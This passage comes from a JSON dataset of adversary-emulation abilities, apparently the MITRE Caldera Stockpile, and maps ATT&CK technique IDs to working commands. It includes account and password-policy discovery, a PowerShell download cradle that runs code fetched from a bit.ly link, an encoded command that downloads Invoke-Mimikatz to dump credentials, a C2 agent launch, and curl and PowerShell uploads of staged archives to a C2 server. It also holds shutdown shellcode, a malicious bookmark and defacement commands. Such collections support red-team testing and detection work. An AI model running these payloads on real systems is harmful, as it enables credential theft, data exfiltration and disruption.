users", "tactic": "discovery", "technique": {"attack_id": "T1087.001", "name": "Account Discovery: Local Account"}, "platforms": {"darwin": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}, "linux": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}}}}], "command_list": ["cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1007", "commands": [{"source": "data/abilities/discovery/c6607391-d02c-44b5-9b13-d3492ca58599.yml", "command": "Get-Service", "name": "Identify system services"}], "parsed_datasets": [{"Mitre Stockpile - Identify system services": {"id": "c6607391-d02c-44b5-9b13-d3492ca58599", "name": "Discover system services", "description": "Identify system services", "tactic": "discovery", "technique": {"attack_id": "T1007", "name": "System Service Discovery"}, "platforms": {"windows": {"psh": {"command": "Get-Service"}}}}}], "command_list": ["Get-Service"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1087.002", "commands": [{"source": "data/abilities/discovery/c7ec57cd-933e-42b6-99a4-e852a9e57a33.yml", "command": "net user /domain", "name": "The net utility is executed via cmd to enumerate domain user accounts."}], "parsed_datasets": [{"Mitre Stockpile - The net utility is executed via cmd to enumerate domain user accounts.": {"id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33", "name": "Account Discovery (all)", "description": "The net utility is executed via cmd to enumerate domain user accounts.", "tactic": "discovery", "technique": {"attack_id": "T1087.002", "name": "Account Discovery: Domain Account"}, "platforms": {"windows": {"cmd": {"command": "net user /domain"}}}}}], "command_list": ["net user /domain"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1201", "commands": [{"source": "data/abilities/discovery/e82f39e2-56f8-4f19-8376-b007f9ac5f8a.yml", "command": "pwpolicy getaccountpolicies\n", "name": "Password Policy Discovery"}, {"source": "data/abilities/discovery/e82f39e2-56f8-4f19-8376-b007f9ac5f8a.yml", "command": "cat /etc/pam.d/common-password\n", "name": "Password Policy Discovery"}, {"source": "data/abilities/discovery/e82f39e2-56f8-4f19-8376-b007f9ac5f8a.yml", "command": "net accounts", "name": "Password Policy Discovery"}], "parsed_datasets": [{"Mitre Stockpile - Password Policy Discovery": {"id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a", "name": "Password Policy", "description": "Password Policy Discovery", "tactic": "discovery", "technique": {"attack_id": "T1201", "name": "Password Policy Discovery"}, "platforms": {"darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}, "windows": {"psh": {"command": "net accounts"}}}}}], "command_list": ["cat /etc/pam.d/common-password", "pwpolicy getaccountpolicies", "net accounts"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1124", "commands": [{"source": "data/abilities/discovery/fa6e8607-e0b1-425d-8924-9b894da5a002.yml", "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "name": "get current system time (ISO 8601)"}, {"source": "data/abilities/discovery/fa6e8607-e0b1-425d-8924-9b894da5a002.yml", "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "name": "get current system time (ISO 8601)"}, {"source": "data/abilities/discovery/fa6e8607-e0b1-425d-8924-9b894da5a002.yml", "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", "name": "get current system time (ISO 8601)"}], "parsed_datasets": [{"Mitre Stockpile - get current system time (ISO 8601)": {"id": "fa6e8607-e0b1-425d-8924-9b894da5a002", "name": "Get System Time", "description": "get current system time (ISO 8601)", "tactic": "discovery", "technique": {"attack_id": "T1124", "name": "System Time Discovery"}, "platforms": {"darwin": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "linux": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "windows": {"psh": {"command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}}}}], "command_list": ["date -u +\"%Y-%m-%dT%H:%M:%SZ\"", "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1087.001", "commands": [{"source": "data/abilities/discovery/feaced8f-f43f-452a-9500-a5219488abb8.yml", "command": "dscl . list /Users | grep -v '_'\n", "name": "Identify all local users"}, {"source": "data/abilities/discovery/feaced8f-f43f-452a-9500-a5219488abb8.yml", "command": "Get-WmiObject -Class Win32_UserAccount\n", "name": "Identify all local users"}], "parsed_datasets": [{"Mitre Stockpile - Identify all local users": {"id": "feaced8f-f43f-452a-9500-a5219488abb8", "name": "Identify local users", "description": "Identify all local users", "tactic": "discovery", "technique": {"attack_id": "T1087.001", "name": "Account Discovery: Local Account"}, "platforms": {"darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}, "windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}}}}], "command_list": ["Get-WmiObject -Class Win32_UserAccount", "dscl . list /Users | grep -v '_'"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/execution/134b49a3-3f93-41bd-85f4-563eadbb6055.yml", "command": "Get-Process -Name \"powershell\" | Stop-Process\n", "name": "Kill all PowerShell processes"}], "parsed_datasets": [{"Mitre Stockpile - Kill all PowerShell processes": {"id": "134b49a3-3f93-41bd-85f4-563eadbb6055", "name": "Stop PowerShell processes", "description": "Kill all PowerShell processes", "tactic": "execution", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}}}], "command_list": ["Get-Process -Name \"powershell\" | Stop-Process"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/execution/315cedf1-4a3a-4015-b63f-149d64bacbbc.yml", "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "name": "Emulate administrator tasks on a system in a separate process"}], "parsed_datasets": [{"Mitre Stockpile - Emulate administrator tasks on a system in a separate process": {"id": "315cedf1-4a3a-4015-b63f-149d64bacbbc", "name": "Emulate Administrator Tasks", "description": "Emulate administrator tasks on a system in a separate process", "tactic": "execution", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"psh,pwsh": {"command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "payloads": ["Emulate-Administrator-Tasks.ps1"]}}}}}], "command_list": ["start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\""], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/execution/3796a00b-b11d-4731-b4ca-275a07d83299.yml", "command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n", "name": "Run an application as a different user"}], "parsed_datasets": [{"Mitre Stockpile - Run an application as a different user": {"id": "3796a00b-b11d-4731-b4ca-275a07d83299", "name": "Impersonate user", "description": "Run an application as a different user", "tactic": "execution", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "host.user.name", "edge": "has_password", "target": "host.user.password"}]}]}}], "command_list": ["$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.004", "commands": [{"source": "data/abilities/execution/b1d41972-3ad9-4aa1-8f7f-05f049a2980e.yml", "command": "nohup ./sandcat.go -server #{server} &\n", "name": "Start a new 54ndc47 agent in background"}, {"source": "data/abilities/execution/b1d41972-3ad9-4aa1-8f7f-05f049a2980e.yml", "command": "nohup ./sandcat.go -server #{server} &\n", "name": "Start a new 54ndc47 agent in background"}], "parsed_datasets": [{"Mitre Stockpile - Start a new 54ndc47 agent in background": {"id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e", "name": "Start 54ndc47", "description": "Start a new 54ndc47 agent in background", "tactic": "execution", "technique": {"attack_id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell"}, "platforms": {"darwin": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}}}}], "command_list": ["nohup ./sandcat.go -server #{server} &"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/execution/bfff9006-d1fb-46ce-b173-92cb04e9a031.yml", "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n", "name": "Download"}], "parsed_datasets": [{"Mitre Stockpile - Download": {"id": "bfff9006-d1fb-46ce-b173-92cb04e9a031", "name": "PowerShell bitly Link Download", "description": "Download", "tactic": "execution", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}}}], "command_list": ["powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/execution/ccdb8caf-c69e-424b-b930-551969450c57.yml", "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n", "name": "Download"}], "parsed_datasets": [{"Mitre Stockpile - Download": {"id": "ccdb8caf-c69e-424b-b930-551969450c57", "name": "PowerShell Invoke MimiKats", "description": "Download", "tactic": "execution", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}}}], "command_list": ["powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA=="], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.002", "commands": [{"source": "data/abilities/execution/de52784d-4de6-4d4e-b79e-e7b68fe037fb.yml", "command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "name": "Add a malicous bookmark which looks like a current one"}], "parsed_datasets": [{"Mitre Stockpile - Add a malicous bookmark which looks like a current one": {"id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb", "name": "Add bookmark", "description": "Add a malicous bookmark which looks like a current one", "tactic": "execution", "technique": {"attack_id": "T1059.002", "name": "Command and Scripting Interpreter: AppleScript"}, "platforms": {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payloads": ["bookmark.scpt"]}}}}}], "command_list": ["osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1560.001", "commands": [{"source": "data/abilities/exfiltration/300157e5-f4ad-4569-b533-9d1fa0e74d74.yml", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "name": "Compress a directory on the file system"}, {"source": "data/abilities/exfiltration/300157e5-f4ad-4569-b533-9d1fa0e74d74.yml", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "name": "Compress a directory on the file system"}, {"source": "data/abilities/exfiltration/300157e5-f4ad-4569-b533-9d1fa0e74d74.yml", "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "name": "Compress a directory on the file system"}], "parsed_datasets": [{"Mitre Stockpile - Compress a directory on the file system": {"id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "name": "Compress staged directory", "description": "Compress a directory on the file system", "tactic": "exfiltration", "technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "platforms": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.staged"}]}]}}], "command_list": ["tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz", "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1041", "commands": [{"source": "data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml", "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n", "name": "Exfil the staged directory"}, {"source": "data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml", "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n", "name": "Exfil the staged directory"}, {"source": "data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml", "command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n", "name": "Exfil the staged directory"}], "parsed_datasets": [{"Mitre Stockpile - Exfil the staged directory": {"id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "name": "Exfil staged directory", "description": "Exfil the staged directory", "tactic": "exfiltration", "technique": {"attack_id": "T1041", "name": "Exfiltration Over C2 Channel"}, "platforms": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.compress"}]}]}}], "command_list": ["curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload", "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1499", "commands": [{"source": "data/abilities/impact/0821b0b0-7902-4a7b-8052-80bda5a43684.yml", "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n", "name": "Force shutdown a target system using Process Injection and raw shellcode"}, {"source": "data/abilities/impact/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml", "command": "./wifi.sh off\n", "name": "Turn a computers WIFI off"}, {"source": "data/abilities/impact/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml", "command": "./wifi.sh off\n", "name": "Turn a computers WIFI off"}, {"source": "data/abilities/impact/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml", "command": ".\\wifi.ps1 -Off\n", "name": "Turn a computers WIFI off"}], "parsed_datasets": [{"Mitre Stockpile - Force shutdown a target system using Process Injection and raw shellcode": {"id": "0821b0b0-7902-4a7b-8052-80bda5a43684", "name": "Shutdown Target System", "description": "Force shutdown a target system using Process Injection and raw shellcode", "tactic": "impact", "technique": {"attack_id": "T1499", "name": "Endpoint Denial of Service"}, "platforms": {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}}}, {"Mitre Stockpile - Turn a computers WIFI off": {"id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "name": "Disrupt WIFI", "description": "Turn a computers WIFI off", "tactic": "impact", "technique": {"attack_id": "T1499", "name": "Endpoint Denial of Service"}, "platforms": {"darwin": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Off\n", "cleanup": ".\\wifi.ps1 -On\n", "payloads": ["wifi.ps1"]}}}}}], "command_list": ["0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05", "./wifi.sh off", ".\\wifi.ps1 -Off"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1489", "commands": [{"source": "data/abilities/impact/3b007f46-23e7-4a11-9c14-e7085b6a754a.yml", "command": "quit app \"Microsoft Outlook.app\"", "name": "Quit Outlook"}], "parsed_datasets": [{"Mitre Stockpile - Quit Outlook": {"id": "3b007f46-23e7-4a11-9c14-e7085b6a754a", "name": "Quit Outlook", "description": "Quit Outlook", "tactic": "impact", "technique": {"attack_id": "T1489", "name": "Service Stop"}, "platforms": {"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}}}], "command_list": ["quit app \"Microsoft Outlook.app\""], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1491", "commands": [{"source": "data/abilities/impact/47d08617-5ce1-424a-8cc5-c9c978ce6bf9.yml", "command": "echo \"proof that this machine was hacked.\" > message.txt\n", "name": "Create a text file for the user to find"}, {"source": "data/abilities/impact/47d08617-5ce1-424a-8cc5-c9c978ce6bf9.yml", "command": "echo \"proof that this machine was hacked.\" > message.txt\n", "name": "Create a text file for the user to find"}, {"source": "data/abilities/impact/47d08617-5ce1-424a-8cc5-c9c978ce6bf9.yml", "command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n", "name": "Create a text file for the user to find"}, {"source": "data/abilities/impact/68235976-2404-42a8-9105-68230cfef562.yml", "command": ".\\Invoke-MemeKatz.ps1\n", "name": "Downloads random meme and sets as desktop background"}, {"source": "data/abilities/impact/68235976-2404-42a8-9105-68230cfef562.yml", "command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "name": "Downloads random meme and sets as desktop background"}], "parsed_datasets": [{"Mitre Stockpile - Create a text file for the user to find": {"id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9", "name": "Leave note", "description": "Create a text file for the user to find", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Defacement"}, "platforms": {"darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}}}}, {"Mitre Stockpile - Downloads random meme and sets as desktop background": {"id": "68235976-2404-42a8-9105-68230cfef562", "name": "Invoke-MemeKatz", "description": "Downloads random meme and sets as desktop background", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Defacement"}, "platforms": {"windows": {"psh,pwsh": {"command": 